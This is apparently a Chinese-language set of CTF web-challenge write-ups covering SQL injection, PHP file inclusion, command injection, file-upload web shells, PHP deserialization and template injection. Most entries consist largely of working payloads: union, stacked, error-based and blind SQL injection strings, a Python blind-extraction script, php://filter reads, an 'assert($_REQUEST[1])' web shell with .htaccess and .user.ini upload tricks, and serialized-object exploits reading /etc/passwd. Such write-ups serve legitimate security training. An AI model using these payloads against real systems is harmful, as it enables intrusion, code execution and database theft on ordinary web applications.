## [极客大挑战 2019]EasySQL

`sql注入`

题目首页

![](./img/1-1.png)

尝试万能密码

```sql
admin' or 1=1#
```

即可拿到`flag`

## [极客大挑战 2019]Havefun

*`传参`*

`查看源代码`

![](./img/2-1.png)

没找到什么东西，查看一下源代码

![image-20231109170331282](.\img\2-2.png)

查看到一串`php`代码

```php
<?php
    $cat=$_GET['cat'];
    echo $cat;
    if($cat=='dog'){
    echo 'Syc{cat_cat_cat_cat}';
}
```

传一下参数`cat=dog`试试

![](./img/2-3.png)

直接拿到`flag`

## [HCTF 2018]WarmUp

`php代码审计`

![](./img/3-1.png)

查看源代码

有个隐藏提示`source.php`

访问`source.php`发现源代码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

`exp`

```
/source.php?file=source.php?/../../../../ffffllllaaaagggg
```

## [ACTF2020 新生赛]Include

`文件包含`

`exp`

```
?file=php://filter/convert.base64-encode/resource=flag.php
```

## [ACTF2020 新生赛]Exec

`命令执行`

没有任何过滤,`exp`

```
1；cat /flag
```

## [GXYCTF2019]Ping Ping Ping

过滤很严格 最后使用

```
1;cat$IFS$9`ls`
```

然后查看源代码看到`flag`

## [强网杯 2019]随便注

`堆叠注入`

![](./img/4-1.png)

注入发现为`单引号注入`

![image-20231109223058542](.\img\4-2.png)

查看列

![image-20231109223131382](.\img\4-4.png)

发现为`2`列

联合注入查一下信息

![image-20231109223245571](./img/4-7.png)

发现过滤了`select`

堆叠注入试试,就是通过`;`号注入多条SQL语句。+

```mysql
1';show databases%23
1';show tables%23
# 表名为数字时，要用反引号包起来查询。
1';show columns from `1919810931114514`%23
1';show columns from words%23
```

查出来了表`1919810931114514`和`words`，

`1919810931114514`表有`flag`列

`words`表有`id`列和`data`列

但是`select`被过滤了，需要绕过

### 方法一 更改查询表名为目标表名及更改对应字段

1. 通过` rename `先把`words` 表改名为其他的表名。
2. 把`1919810931114514`表的名字改为`words`
3. 给`words`表添加新的列名`id`
4. 将`flag`字段名改为与`words`中相同的列名`data`

然后就可以通过查询`id`得方法查出来`flag`字段的内容了

```mysql
1';rename table words to word1;rename table `1919810931114514` to words;alter table words add id int not NULL auto_increment primary key;alter table words change flag data varchar(100);%23
```

提交`payload`后，再查询`id`为`1`的数据，就可以查到`flag`

![](./img/4-8.png)

### 方法二 预处理语句配合十六进制编码

因为`select`被过滤了

```
所以先将select * from `1919810931114514`进行16进制编码
```

再构造预处理语句

```mysql
;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#
# 因上述方法更改了flag表，所以真实的flag在words表中，所以重新编码
0';Set@a=0x73656c656374202a2066726f6d2060776f72647360;prepare execsql from @a;execute execsql;%23
```

### 方法三

```mysql
1'; handler `1919810931114514` open as `a`; handler `a` read next;#
```

## [SUCTF 2019]EasySQL

`堆叠注入`

`sql_mode管道符`

堆叠注入试试

```mysql
1;show databases;-- -
1;show tables;-- -
1;show columns from `Flag`;-- - # 最后两个
1;desc Flag;-- -
```

### 原查询语句猜测

根据回显猜测代码里的SQL语句

回显用的是`var_dump`函数，当查询语句为纯数字的时候才回显。

数据库的特性，当`select`后面是数字的时候，即使查询的字段没有也不会报错，当查询的带有`英文字母`的时候，就会产生报错，所以初步判断查询的内容应该不是以往那种`SQL注入`的题目在`where后面`

而这里的就是在`select后面`的 ，试一下查询`1,2,3,4,5`

![image-20231109232431928](./img/4-9.png)

猜想正确，注意到原本查询唯独末尾的`5`变为了`1`，猜测是用到了`管道符`（`|` `||`之类的），导致`5`回显失败，这里先试试看查询

```
*,1
```

直接得到了`flag`，算是个非预期解

![](./img/5-2.png)

原`php`代码中的`SQL`语句应该是

```php
$sql = "select ".$_POST[query]."|| xxx from Flag" ;
```

### 预期解

这时候我们可以利用数据库的语句，更改`||`的意思，把它改为`连接符`，这样的话，不管输入啥都会查询到`flag`这个字段，构建`payload`

```sql
1;set sql_mode=pipes_as_concat;select 1
```

这样的话SQL语句就变成了

```sql
select 1;set sql_mode=pipes_as_concat;select 1 || flag from Flag
```

## [极客大挑战 2019]Secret File

`代码审计`

找到代码审计点

```
http://76976e53-a4e7-4314-9cbe-bedaeeb61700.node4.buuoj.cn:81/secr3t.php
```

```php
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

发现没有过滤`php://filter`

直接使用`php://filter`读取`flag.php`即可获取`flag`

```
secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

## [极客大挑战 2019]LoveSQL

正常回显`联合注入`

```sql
?username=1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
?username=1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="l0ve1ysq1"%23&password=1
?username=1'union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1
```

## [极客大挑战 2019]Upload

上传`.phtml`

`Content-Type: image/gif`

```
GIF89a
<script language='php'>assert($_REQUEST[1]);</script>
```

正常连接即可

## [ACTF2020 新生赛]Upload

同上题一样

`phtml`文件上传

## [极客大挑战 2019]BabySQL

`sql注入`

`双写绕过`

注意`information_schema`中包含`or`，所以双写绕过为`infoorrmation_schema`

```sql
check.php?username=1%27ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23&password=123

?username=1%27ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name="b4bsql"%23&password=123

?username=1%27ununionion selselectect 1,2,group_concat(id,username,passwoorrd) frfromom b4bsql%23&password=123
```

## [极客大挑战 2019]PHP

`php反序列化`

`代码审计`

进入首页有提示备份源码

常见的压缩包路径查看，发现`www.zip`

下载后在`index.php`中发现反序列化入口

```php
<!DOCTYPE html>
<head>
  <meta charset="UTF-8">
  <title>I have a cat!</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
      <link rel="stylesheet" href="style.css">
</head>
<style>
    #login{   
        position: absolute;   
        top: 50%;   
        left:50%;   
        margin: -150px 0 0 -150px;   
        width: 300px;   
        height: 300px;   
    }   
    h4{   
        font-size: 2em;   
        margin: 0.67em 0;   
    }
</style>
<body>







<div id="world">
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
    </div>
    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</div>
<script src='http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'></script>
<script  src="index.js"></script>
</body>
</html>
```

入口为

```php
<?php
include 'class.php';
$select = $_GET['select'];
$res=unserialize(@$select);
?>
```

进入`class.php`中构造`payload`

```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

发现要让`username`为`admin`，`password`为`100`,但是在反序列化后在`__wakeup`时`username`会变为`guest`，所以在反序列化时需要绕过`__wakeup`

绕过`__wakeup`

常见的反序列化字符串为`O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}`

`"Name":2:`代表有`2`个变量，当我们更改数字大于`2`时，即可绕过`__wakeup()`

`payload`

```php
<?php

class Name{
    private $username = 'admin';
    private $password = 100;
}


$a = new Name();

echo serialize($a) . "<br>";
echo urlencode(serialize($a));
```

最后更改`2`为`3`即可绕过获取`flag`

最终`payload`

```
O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D
```

## [ACTF2020 新生赛]BackupFile

`php弱类型比较`

找到备份文件`index.php.bak`

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}

```

传入`key`为`123`即可

## [RoarCTF 2019]Easy Calc

代码审计

`calc.php`

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>

```

我们知道`PHP`将查询字符串（在`URL`或正文中）转换为内部`$_GET`或的关联数组`$_POST`。例如：`/?foo=bar`变成`Array([foo] => “bar”)`。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，`/?%20news[id%00=42`会转换为`Array([news_id] => 42)`。如果一个`IDS/IPS`或`WAF`中有一条规则是当`news_id`参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：

`/news.php?%20news[id%00=42"+AND+1=0–`

上述`PHP`语句的参数`%20news[id%00`的值将存储到`$_GET["news_id"]`中。

`PHP`需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：

> 1.删除空白符
>
> 2.将某些字符转换为下划线（包括空格）

在了解到`PHP`的字符串解析之后，我们思考一个问题，`WAF`它不让`num`参数`传入字母`，所以我们不能让`WAF文件检测到字母`，但是我们又需要传入字母来构成我们的命令，这种情况下我们该怎么对其进行绕过呢？

绕过方法

因为`num`不可以传入字母，但是我们在`num`参数之前添加一个空格，这样在`PHP`的语言特性下会`默认删除这个空格`，但是`WAF`会因为这个空格导致检测不到`num`这个参数，最终导致`WAF`被绕过。

Payload

>
> <http://node4.buuoj.cn:25591/calc.php?num=a> #被拦截
>
>
> <http://node4.buuoj.cn:25591/calc.php>? num=a #绕过WAF

```
/calc.php? num=var_dump(scandir(chr(47)))
calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
```

[参考文章](https://www.cnblogs.com/sfsec/p/15205011.html)

## [极客大挑战 2019]BuyFlag

`Cookie`

更改`Cookie`中的`user`值为`1`

根据源代码的要求

```php
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

传入`password`和`money`

绕过后的`payload`

```
password=404a&money=1e9
```

## [BJDCTF2020]Easy MD5

响应头里有

`select * from 'admin' where password=md5($pass,true)`

![img](./img/6-1.png)

这里说一下两个的联系，这里的`16`位秘文和`32`位秘文的第`8-24`位子字符串时一样的，也就是中间的`16`位。

这里的原始`16`字符二进制格式一般会有乱码，如果想解决的话

1.对输出的`16`位字节的二进制转换为十六进制。

2.取`32`位秘文的中间`16`位

如果`MD5`值经过`hex`后，就构成万能密码进行了`sql注入`，这个就是这个题的关键

在`mysql`里面，在用作布尔型判断时，以数字开头的字符串会被当做整型数。

要注意的是这种情况是必须要有单引号括起来的，比如`password=‘xxx’ or ‘1xxxxxxxxx’`，那么就相当于`password=‘xxx’ or 1` ，也就相当于`password=‘xxx’ or true`，所以返回值就是`true`。

```php
<?php 
for ($i = 0;;) {
 for ($c = 0; $c < 1000000; $c++, $i++)
  if (stripos(md5($i, true), '\'or\'') !== false)
   echo "\nmd5($i) = " . md5($i, true) . "\n";
 echo ".";
}
?>//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/
```

这里提供一个最常用的：`ffifdyop`，该字符串`md5`加密后若`raw`参数为`True`时会返回` 'or'6 `(其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为`True`，后面的会在`MySQL`将其转换成整型比较时丢掉)

所以如果这里我们输入`ffifdyop`，后端的`SQL语句`会变成：

```sql
select * from 'admin' where password=''or'6<trash>'           --->  True
```

后面的就是数组绕过`md5`

都是

```
a[]=1&b[]=2
```

这样的`数组绕过md5`

## [护网杯 2018]easy_tornado

`tornado模块注入`

`error?msg={{1}}`

存在`msg`参数，百度之后发现师傅们可以进行模块注入。尝试了`error?msg={{1}}`，发现的确存在模块注入。然后我们尝试用`+-*/`发现都报错，应该是被`过滤`了。

而我们查官方文档，`tornado`在搭建一个网站时，肯定会有多个`handler`，而这些`handler`都是`RequestHandler`的子类

`RequestHandler.settings`又指向`self.application.settings`

所以我们可以说`handler.settings`指向了`RequestHandler.settings`了，对吧

这样我们就可以构造一下`payload`：`?msg={{handler.settings}}`

拿到`cookie_secret`之后的`exp`

```python
import hashlib
cookie='fef4cbca-8841-4c4e-9d69-7c20990a6d11'
file_filename='/fllllllllllllag'
md5_filename=hashlib.md5(file_filename.encode(encoding='UTF-8')).hexdigest()
word=cookie+md5_filename
flag=hashlib.md5(word.encode(encoding='UTF-8')).hexdigest()
print(flag)
```

最后`payload`

`?filename=/fllllllllllllag&filehash=c61c635cb683b21a9f39fdf1af9ca9e8`

[参考](https://www.cnblogs.com/junlebao/p/13819357.html)

## [HCTF 2018]admin

非预期解

1.**ᴬᴰᴹᴵᴺ**  `Unicode`欺骗

2.我注册了`admin1`

密码是`123`

登录的时候少输了，输成了`admin`，直接拿到了`flag`，所以密码居然直接是`123`......

预期解

`flask-session-cookie-manager-master`

`-s secret-key -c cookie`

`-t 加密内容 -s secret-key`

主要还是把解密后的值改为`admin`刷新`cookie`即可获取`flag`

## [MRCTF2020]你传你🐎呢

`.htaccess上传`

`文件上传`

```
<FilesMatch "1.png">
SetHandler application/x-httpd-php
</FilesMatch>
```

传上去 文件名包含`1.png`的文件都会解析为`php`文件

`.htaccess`一定不要写错文件名

## [ZJCTF 2019]NiZhuanSiWei

`php代码审计`

`php伪协议`

刚进来发现是`php`代码

看一下源码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

发现有反序列化函数 但是没有传参点 发现有提示`useless.php`

使用伪协议读取一下内容，注意`include($file)`直接传入`useless.php`会被解析为`php文件`之后被执行，想要读取文件内容则需要使用伪协议

`payload`

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php
```

读取到`useless.php`文件的内容为

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

发现有反序列化的点，并且在源代码时被调用`echo`，所以执行`__toString()`方法

```php
$password = unserialize($password);
echo $password;
```

编写`exp`

```php
<?php  

class Flag{  //flag.php  
    public $file = "php://filter/convert.base64-encode/resource=flag.php";  
}  

$a = new Flag();
echo serialize($a);
?>  
```

做题的时候忘了`useless.php`还没有包含执行，就在那反序列化了，所以最终`payload`为

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:52:"php://filter/convert.base64-encode/resource=flag.php";}
```

## [极客大挑战 2019]HardSQL

`xpath报错注入`

`函数注入`

`extractvalue`

**extractvalue()**
extractvalue() :对XML文档进行查询的函数

语法：`extractvalue(目标xml文档，xml路径)`

第一个参数 :  第一个参数可以传入目标`xml文档`

第二个参数： `xml`中的位置是可操作的地方，`xml`文档中查找字符位置是用 `/xxx/xxx/xxx/…`这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。

正常查询 第二个参数的位置格式 为`/xxx/xx/xx/xx` ,即使查询不到也不会报错

tip: 还有要注意的地方是，它能够查询的字符串长度最大是32个字符，如果超过32位，我们就需要用函数来查询，比如`right()`,`left()`，`substr()`来截取字符串

再举个栗子：

`SELECT ExtractValue('<a><b><b/></a>', '/a/b');` 这个语句就是寻找前一段`xml文档`内容中的`a`节点下的`b`节点，这里如果`Xpath`格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。

利用`concat`函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出。

知道这些知识之后，我们开始注入吧

用`^`来连接函数，形成异或
这边用的是`extractvalue()`

```
爆数据库
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(database())),0x7e))%23
然后，我们再payload爆表名，但是这里把等于号给我们过滤了，不过我们还有骚操作like用法
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e))%23
爆字段
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e))%23
查数据
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e))%23
字符串较长 使用left() right() substr()
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e))%23
?username=admin&password=admin'^extractvalue(1,concat(0x7e,(select(group_concat(left(password,30)))from(H4rDsq1)),0x7e))%23

or注入也可以
1'or(extractvalue(1,concat(0x7e,(select(database())),0x7e)))#
```

[参考](https://www.cnblogs.com/junlebao/p/13836583.html)

## [MRCTF2020]Ez_bypass

`php代码审计`

`弱类型比较`

```php
I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```

`payload`

```
GET:
?gg[]=1&id[]=2

POST
passwd=1234567a
```

## [网鼎杯 2020 青龙组]AreUSerialz

`php代码审计`

`强弱类型比较`

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

首先找序列化开始和目标函数

开始函数为

```php
if(is_valid($str)) {
 $obj = unserialize($str);
}
```

目标函数为，直接将`$this->filename`用伪协议读取文件内容，一般测试`payload`是否正确，可读取`/etc/passwd`测试

```php
private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
}
```

然后查找`POP链`，`process`调用`read` 函数

```php
public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
```

反序列化直接调用`process`

所以`pop链`为`FileHandler::process()->FileHandler::read()`

并且需要`FileHandler::op == "2"`且`FileHandler::op !== "2"`

这就涉及强类型和弱类型数据比较,`op`为数字`2`时同时满足上述条件

所以`exp`为

```php
<?php  

class FileHandler{
    protected $op=2;
    protected $filename="php://filter/convert.base64-encode/resource=/etc/passwd";
    protected $content;
}

$a = new FileHandler();
echo serialize($a);
?>  
```

但是这道题有过滤

```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
```

所以在对`protected`类型数据传参时无法传入`%00`

绕过方法一

`php7.1+`版本对属性类型不敏感，本地序列化的时候将属性改为`public`进行绕过即可

```php
<?php  

class FileHandler{
    public $op=2;
    public $filename="php://filter/convert.base64-encode/resource=/etc/passwd";
    public $content;
}

$a = new FileHandler();
echo serialize($a);
?>  
```

![image-20231110224045679](./img/7-1.png)

发现读取成功

绕过方法二

**利用大写S采用的16进制，来绕过is_valid中对空字节的检查。 //00 替换 %00**

```php
<?php  

class FileHandler{
    protected $op=2;
    protected $filename="/etc/passwd";  // 最后需要手动修改passwd为小写
    protected $content;
}

$a = new FileHandler();
$b = urlencode(serialize($a));
$b = str_replace("s", "S", $b);
$b = str_replace("%00", "\00", $b);
echo $b;
?>  
```

```
http://b6e037f4-5bb0-4a2b-866b-df7c1416fc12.node4.buuoj.cn:81/?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A11%3A%22%2Fetc%2Fpasswd%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D
```

## [SUCTF 2019]CheckIn

`.user.ini利用`

`文件上传`

上传`.user.ini`

```
Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
Content-Type: image/gif

GIF89a
auto_prepend_file=1.gif
```

上传`shell`

```
Content-Disposition: form-data; name="fileUpload"; filename="1.gif"
Content-Type: image/gif

GIF89a
<script language='php'>assert($_REQUEST[1]);</script>
```

最后使用同目录下的`index.php`文件运行`shell`

因为`.user.ini`会使当前目录下的所有`php`文件包含`auto_prepend_file`后的文件

## [GXYCTF2019]BabyUpload

`.htaccess上传`

`文件上传`

`system函数过滤`

将`system`函数过滤后，可以用`show_source`函数读取文件

## [GXYCTF2019]BabySQli

直接可以用联合注入，表里有三列

```
1' Order by 3#
```

进行用联合注入，回显wrong user!，说明用户不在第一列

```
1' union select 1,2,3#
```

尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列

```
1' union select 1,'admin',3#
```

接下里就是要绕过密码的`md5`验证，需要把我们输入的值和数据库里面存放的用户密码的`md5`值进行比较，那要怎么绕过呢？可以用联合查询语句用来生成虚拟的表数据

首先可以看到该表只有一个用户

![img](.\img\8-1.png)

 然后我们可以用联合查询的方式将查询的数据插入到表中

![img](.\img\8-2.png)

这题的知识点是绕过密码的`md5`验证

 通过这样的方式，我们就可以用构造`payload`

用户名输入（`202cb962ac59075b964b07152d234b70`是 `123`的`md5`值）

```sql
name=1'union%20select%201,'admin','202cb962ac59075b964b07152d234b70'%23&pw=123
```

[参考](https://www.cnblogs.com/gaonuoqi/p/12355035.html)

## [GYCTF2020]Blacklist

`handler`

`堆叠注入`

需要用到HANDLER：

> 例如，**HANDLER tbl_name OPEN**打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
>
> 通过**HANDLER tbl_name READ FIRST**获取句柄的第一行，通过**READ NEXT**依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
>
> 通过**HANDLER tbl_name CLOSE**来关闭打开的句柄。

这道题照葫芦画瓢payload如下：

```sql
1'; handler `FlagHere` open as `a`; handler `a` read next;#
```

[参考](https://www.shawroot.cc/1115.html)

## [CISCN2019 华北赛区 Day2 Web1]Hack World

`sql注入`

`bool盲注`

`payload`

根据1和2返回结果的不同，可能是bool盲注，`()`没有过滤，可以使用大部分函数，当时是卡在了空格的绕过
空格的绕过有这些方法我测试是可以的
`%09` `%0a` `%0b` `%0c` `%0d` `/**/` `/*!*/`或者直接tab
`%20` 好像没法绕，`%00`截断好像也影响sql语句的执行
或者用括号也可以。任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。
本题中可以`if(ascii(substr((select(flag)from(flag)),1,1))=ascii('f'),1,2)`

```
id=0^(ascii(substr((select(flag)from(flag)),1,1))>101)
```

`exp.py`

```python
import requests

url = 'http://5cc23316-a978-42e6-ac81-c850336c7bfc.node4.buuoj.cn:81/index.php'
result = ''

for x in range(1, 50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)" % (x, mid)
        data = {
            "id":payload
        }
        response = requests.post(url, data = data)
        response.encoding = response.apparent_encoding
        if 'Hello' in response.text:  # 正常回显特征
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)
```

[参考1](https://www.cnblogs.com/20175211lyz/p/11435298.html)

[参考2](https://www.cnblogs.com/zzjdbk/p/13650826.html)

## [网鼎杯 2018]Fakebook

`robots.txt`里有`/user.php.bak`

下载后内容为

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

```
?no=1%20order%20by%205 // 回显错误
?no=1%20order%20by%204 // 正常回显
```

因为过滤了空格，使用`/**/`绕过

`/view.php?no=-1%20union/**/select%201,2,3,4`

发现`2`回显，使用`load_file`读取文件

`/view.php?no=-1%20union/**/select%201,load_file('/var/www/html/flag.php'),3,4`

可以直接读取到`flag`，然后查看源码即可读取到`flag`

也可以继续注入

```
/view.php?no=-1%20union/**/select%201,database(),3,4
return: fakeroot

/view.php?no=-1%20union/**/select%201,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
return: users

/view.php?no=-1%20union/**/select%201,group_concat(column_name),3,4 from information_schema.columns where table_name="users"
return: no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 

/view.php?no=-1%20union/**/select%201,group_concat(username,passwd),3,4 from users
